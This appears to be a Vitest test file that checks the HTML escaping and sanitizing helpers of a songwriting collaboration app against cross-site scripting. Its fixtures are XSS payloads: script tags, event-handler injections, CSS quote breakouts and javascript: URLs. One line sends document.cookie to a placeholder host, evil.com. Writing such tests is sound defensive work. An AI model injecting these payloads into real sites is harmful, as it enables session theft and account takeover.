import { describe, it, expect } from 'vitest';
import { escapeHtml, sanitizeLyricsHtml, safeAvatarColor, isSafeCssValue } from './htmlSecurity';

describe('Desktop HTML Security & Safe Rendering', () => {
  describe('escapeHtml utility', () => {
    it('handles null, undefined, and non-string types safely', () => {
      expect(escapeHtml(null)).toBe('');
      expect(escapeHtml(undefined)).toBe('');
      expect(escapeHtml('')).toBe('');
      expect(escapeHtml(12345)).toBe('12345');
      expect(escapeHtml(0)).toBe('0');
      expect(escapeHtml(false)).toBe('false');
    });

    it('escapes special HTML characters: &, <, >, ", \'', () => {
      expect(escapeHtml('Rock & Roll')).toBe('Rock &amp; Roll');
      expect(escapeHtml('<script>alert("XSS")</script>')).toBe('&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;');
      expect(escapeHtml("John's Band")).toBe('John&#039;s Band');
      expect(escapeHtml('"><img src=x onerror=alert(1)>')).toBe('&quot;&gt;&lt;img src=x onerror=alert(1)&gt;');
    });

    it('neutralizes malicious payload injection attempts in project and participant names', () => {
      const maliciousName = '<img src=x onerror="fetch(\'http://evil.com/steal?cookie=\'+document.cookie)">';
      const escaped = escapeHtml(maliciousName);
      expect(escaped).not.toContain('<img');
      expect(escaped).not.toContain('<');
      expect(escaped).not.toContain('>');
      expect(escaped).toContain('&lt;img src=x onerror=&quot;');
    });
  });

  describe('safeAvatarColor utility', () => {
    it('allows valid hex colors, rgb/rgba, hsl/hsla, and CSS variables', () => {
      expect(safeAvatarColor('#38bdf8')).toBe('#38bdf8');
      expect(safeAvatarColor('#fff')).toBe('#fff');
      expect(safeAvatarColor('#06b6d4')).toBe('#06b6d4');
      expect(safeAvatarColor('#f59e0b')).toBe('#f59e0b');
      expect(safeAvatarColor('#ec4899')).toBe('#ec4899');
      expect(safeAvatarColor('rgb(56, 189, 248)')).toBe('rgb(56, 189, 248)');
      expect(safeAvatarColor('rgba(56, 189, 248, 0.8)')).toBe('rgba(56, 189, 248, 0.8)');
      expect(safeAvatarColor('hsl(200, 95%, 60%)')).toBe('hsl(200, 95%, 60%)');
      expect(safeAvatarColor('var(--accent-voice)')).toBe('var(--accent-voice)');
      expect(safeAvatarColor('var(--accent-primary)')).toBe('var(--accent-primary)');
    });

    it('neutralizes quote breakout and attribute injection attempts in avatarColor', () => {
      expect(safeAvatarColor('red" onmouseover="alert(1)"')).toBe('#38bdf8');
      expect(safeAvatarColor('"><script>alert(1)</script>')).toBe('#38bdf8');
      expect(safeAvatarColor('#38bdf8; position: fixed; z-index: 9999;')).toBe('#38bdf8');
      expect(safeAvatarColor('#38bdf8" style="background: red')).toBe('#38bdf8');
      expect(safeAvatarColor('expression(alert(1))')).toBe('#38bdf8');
      expect(safeAvatarColor('url(javascript:alert(1))')).toBe('#38bdf8');
    });

    it('handles null, undefined, and non-string types with fallback', () => {
      expect(safeAvatarColor(null)).toBe('#38bdf8');
      expect(safeAvatarColor(undefined)).toBe('#38bdf8');
      expect(safeAvatarColor('', '#f59e0b')).toBe('#f59e0b');
      expect(safeAvatarColor(12345, '#06b6d4')).toBe('#06b6d4');
    });
  });

  describe('isSafeCssValue utility', () => {
    it('accepts valid safe CSS values', () => {
      expect(isSafeCssValue('#38bdf8')).toBe(true);
      expect(isSafeCssValue('16px')).toBe(true);
      expect(isSafeCssValue('center')).toBe(true);
      expect(isSafeCssValue('bold')).toBe(true);
      expect(isSafeCssValue('1.5')).toBe(true);
      expect(isSafeCssValue('rgb(255, 0, 0)')).toBe(true);
    });

    it('rejects CSS values with quotes, breakouts, or dangerous schemes', () => {
      expect(isSafeCssValue('red" onmouseover="alert(1)')).toBe(false);
      expect(isSafeCssValue("red' onclick='alert(1)")).toBe(false);
      expect(isSafeCssValue('red&quot; onload=alert(1)')).toBe(false);
      expect(isSafeCssValue('url("javascript:alert(1)")')).toBe(false);
      expect(isSafeCssValue('expression(alert(1))')).toBe(false);
      expect(isSafeCssValue('javascript:alert(1)')).toBe(false);
      expect(isSafeCssValue('red; position: fixed')).toBe(false);
      expect(isSafeCssValue('<script>')).toBe(false);
    });
  });

  describe('sanitizeLyricsHtml utility (DOM-based allowlist)', () => {
    it('removes executable <script> tags completely', () => {
      const dirty = 'Verse 1<script>alert("hacked")</script> Line 2';
      const clean = sanitizeLyricsHtml(dirty);
      expect(clean).not.toContain('<script');
      expect(clean).not.toContain('alert');
      expect(clean).toContain('Verse 1 Line 2');
    });

    it('strips dangerous elements like iframe, object, embed, svg, and form', () => {
      const dirty = '<iframe src="javascript:alert(1)"></iframe><object data="bad.swf"></object><svg onload="alert(2)"></svg>Chorus';
      const clean = sanitizeLyricsHtml(dirty);
      expect(clean).not.toContain('<iframe');
      expect(clean).not.toContain('<object');
      expect(clean).not.toContain('<svg');
      expect(clean).toContain('Chorus');
    });

    it('strips all inline event handlers (onerror, onload, onclick, onmouseover, etc.)', () => {
      const dirty = '<p onclick="stealData()" onmouseover="boom()" onerror="bad()">My lyrics line</p>';
      const clean = sanitizeLyricsHtml(dirty);
      expect(clean).not.toContain('onclick');
      expect(clean).not.toContain('onmouseover');
      expect(clean).not.toContain('onerror');
      expect(clean).toContain('<p>My lyrics line</p>');
    });

    it('prevents CSS style attribute quote breakout attacks', () => {
      // 1. Single quote wrapper with double quote breakout
      const attack1 = '<span style=\'color: red" onmouseover="alert(1)\'>Vocal Line</span>';
      const clean1 = sanitizeLyricsHtml(attack1);
      expect(clean1).not.toContain('onmouseover');
      expect(clean1).not.toContain('alert');

      // 2. Entity encoded quote breakout
      const attack2 = '<p style="font-family: &quot; onfocus=alert(1)&quot;;">Chorus Line</p>';
      const clean2 = sanitizeLyricsHtml(attack2);
      expect(clean2).not.toContain('onfocus');
      expect(clean2).not.toContain('alert');

      // 3. Double quote wrapper with single quote breakout
      const attack3 = '<div style="font-size: 14px\' onclick=\'alert(1)">Bridge Line</div>';
      const clean3 = sanitizeLyricsHtml(attack3);
      expect(clean3).not.toContain('onclick');
      expect(clean3).not.toContain('alert');

      // 4. Injected javascript scheme in style
      const attack4 = '<span style="background-image: url(\'javascript:alert(1)\'); color: red;">Injected</span>';
      const clean4 = sanitizeLyricsHtml(attack4);
      expect(clean4).not.toContain('javascript');
      expect(clean4).not.toContain('background-image');
      expect(clean4).toContain('color: red');

      // 5. Injected expression in style
      const attack5 = '<b style="color: expression(alert(1)); font-weight: bold;">Bold Line</b>';
      const clean5 = sanitizeLyricsHtml(attack5);
      expect(clean5).not.toContain('expression');
      expect(clean5).toContain('font-weight: bold');
    });

    it('preserves rich songwriting formatting tags (b, i, u, strike, strong, em, p, div, br)', () => {
      const songwritingHtml = '<b>[Verse 1]</b><br><i>Soft whisper</i> in the <u>night</u><br><s>Old line</s><br><div>Second block</div>';
      const clean = sanitizeLyricsHtml(songwritingHtml);
      expect(clean).toContain('<b>[Verse 1]</b>');
      expect(clean).toContain('<i>Soft whisper</i>');
      expect(clean).toContain('<u>night</u>');
      expect(clean).toContain('<s>Old line</s>');
      expect(clean).toContain('<div>Second block</div>');
    });

    it('preserves song section tags and doc page break gaps while filtering unknown classes', () => {
      const dirty = '<div class="song-section-tag evil-class">[Chorus 1]</div><div class="doc-page-break-gap malicious">[Bridge]</div><span class="untrusted">vocal</span>';
      const clean = sanitizeLyricsHtml(dirty);
      expect(clean).toContain('class="song-section-tag"');
      expect(clean).toContain('class="doc-page-break-gap"');
      expect(clean).not.toContain('evil-class');
      expect(clean).not.toContain('malicious');
      expect(clean).not.toContain('untrusted');
    });

    it('preserves safe styling (color, background-color, font-size, line-height, text-align)', () => {
      const styled = '<span style="color: #38bdf8; font-size: 16px; text-align: center;">Vocal Hook</span>';
      const clean = sanitizeLyricsHtml(styled);
      expect(clean).toContain('color: #38bdf8');
      expect(clean).toContain('font-size: 16px');
      expect(clean).toContain('text-align: center');
    });

    it('preserves multi-line formatting and intentional line breaks', () => {
      const lyricsWithBreaks = 'Line 1<br>Line 2<br><br><div>Line 3</div><div>Line 4</div>';
      const clean = sanitizeLyricsHtml(lyricsWithBreaks);
      expect(clean).toContain('Line 1<br>Line 2<br><br><div>Line 3</div><div>Line 4</div>');
    });
  });

  describe('User-controlled field rendering protection', () => {
    it('ensures project titles and descriptions are sanitized when interpolated', () => {
      const project = {
        name: '<script>alert("project")</script>Album Master',
        description: 'Recorded by <img src=x onerror=alert(1)>'
      };

      const safeTitle = escapeHtml(project.name);
      const safeDesc = escapeHtml(project.description);

      expect(safeTitle).toBe('&lt;script&gt;alert(&quot;project&quot;)&lt;/script&gt;Album Master');
      expect(safeDesc).toBe('Recorded by &lt;img src=x onerror=alert(1)&gt;');
    });

    it('ensures collaborator names, handles, and avatars are safely formatted', () => {
      const collaborator = {
        displayName: '<b onmouseover=alert(1)>Producer Bob</b>',
        username: 'bob"><script>',
        avatarColor: 'red" onmouseover="alert(1)"'
      };

      const initials = escapeHtml(collaborator.displayName.split(' ').map(n => n[0]).join('').toUpperCase().slice(0, 2));
      const safeName = escapeHtml(collaborator.displayName);
      const safeHandle = escapeHtml(collaborator.username);
      const safeColor = safeAvatarColor(collaborator.avatarColor);

      expect(safeName).toContain('&lt;b onmouseover=alert(1)&gt;Producer Bob&lt;/b&gt;');
      expect(safeHandle).toContain('bob&quot;&gt;&lt;script&gt;');
      expect(initials).not.toContain('<');
      expect(safeColor).toBe('#38bdf8');
      expect(safeColor).not.toContain('onmouseover');
    });

    it('ensures session summary event descriptions are safely formatted', () => {
      const eventDesc = 'Created task "<script>stealData()</script>" in workspace';
      const safeDesc = escapeHtml(eventDesc);
      expect(safeDesc).toBe('Created task &quot;&lt;script&gt;stealData()&lt;/script&gt;&quot; in workspace');
    });

    it('ensures window and DAW titles are safely formatted', () => {
      const windowSource = {
        name: 'Browser Window - <img src=x onerror=alert("hacked")>'
      };
      const safeName = escapeHtml(windowSource.name);
      expect(safeName).toContain('&lt;img src=x onerror=alert(&quot;hacked&quot;)&gt;');
      expect(safeName).not.toContain('<img');
    });
  });
});
